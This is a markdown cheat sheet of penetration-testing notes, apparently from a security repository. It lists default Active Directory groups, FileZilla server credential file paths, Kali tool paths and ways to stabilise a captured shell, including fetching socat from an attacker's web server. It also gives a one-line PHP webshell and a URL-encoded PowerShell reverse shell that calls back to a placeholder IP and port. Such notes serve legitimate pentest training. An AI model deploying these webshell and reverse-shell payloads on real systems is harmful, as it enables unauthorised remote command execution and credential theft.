<a name="top"></a>[:house:](README.md)

# :skull: <a name="notes"></a>Notes

- [Default Security Groups](#notebook-default-security-groups)
- [FileZilla Credentials Locations](#notebook-filezilla-credentials-locations)
- [Kali Paths To Useful Things](#notebook-kali-paths-to-useful-things)
- [Shell Stabilization](#notebook-shell-stabilization)
- [Simple PHP Webshell](#notebook-simple-php-webshell)
- [URL Encoded Powershell Reverse Shell](#notebook-url-encoded-powershell-reverse-shell)	

## :notebook: Default Security Groups

- **Domain Controllers** - All domain controllers in the domain
- **Domain Guests** - All domain guests
- **Domain Users** - All domain users
- **Domain Computers** - All workstations and servers joined to the domain
- **Domain Admins** - Designated administrators of the domain
- **Enterprise Admins** - Designated administrators of the enterprise
- **Schema Admins** - Designated administrators of the schema
- **DNS Admins** - DNS Administrators Group
- **DNS Update Proxy** - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
- **Allowed RODC Password Replication Group** - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
- **Group Policy Creator Owners** - Members in this group can modify group policy for the domain
- **Denied RODC Password Replication Group** - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
- **Protected Users** - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
- **Cert Publishers** - Members of this group are permitted to publish certificates to the directory
- **Read-Only Domain Controllers** - Members of this group are Read-Only Domain Controllers in the domain
- **Enterprise Read-Only Domain Controllers** - Members of this group are Read-Only Domain Controllers in the enterprise
- **Key Admins** - Members of this group can perform administrative actions on key objects within the domain.
- **Enterprise Key Admins** - Members of this group can perform administrative actions on key objects within the forest.
- **Cloneable Domain Controllers** - Members of this group that are domain controllers may be cloned.
- **RAS and IAS Servers** - Servers in this group can access remote access properties of users

## :notebook: Filezilla Credentials Locations

- `C:\Program Files\FileZilla Server\FileZilla Server.xml`
- `C:\xampp\FileZilla Server\FileZilla Server.xml`

## :notebook: Kali Paths To Useful Things

- `/usr/share/john` - Xtojohn conversion tools.
- `/usr/share/nmap/scripts` - NSE scripts.
- `/usr/share/webshells` - A variety of webshells.
- `/usr/share/windows-resources/binaries` - Useful Windows things.
- `/usr/share/wordlists` - Home of rockyou.txt and dirbuster wordlists.

## :notebook: Shell Stabilization

- [rlwrap](#page_facing_up-rlwrap)
- [Stabilizing With Socat](#page_facing_up-stabilizing-with-socat)
- [Stabilizing A Linux Shell](#page_facing_up-stabilizing-a-linux-shell)

### :page_facing_up: rlwrap

**rlwrap** is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

```
rlwrap nc -lvnp <port>
```

Prepending our netcat listener with `rlwrap` gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by backgrounding the shell with Ctrl+Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### :page_facing_up: Stabilizing With Socat

Another way to stabilize a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`).
 
### :page_facing_up: Stabilizing A Linux Shell

- `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl+C will kill the shell.
- `export TERM=xterm` will give us access to term commands such as `clear`.
- background the shell using Ctrl+Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl+C to kill processes). It then foregrounds the shell, thus completing the process.
- Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter. 

## :notebook: Simple PHP Webshell

```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

## :notebook: URL Encoded Powershell Reverse Shell

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27**\<IP>**%27%2C**\<PORT>**%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

See: [Powershell Reverse Shell](commands.md#powershell-reverse-shell)

<p align="right"><a href="#notes">:up:</a> <a href="#top">:top:</a></p>

<p align="center"><img src="https://picsum.photos/800/100"></p>

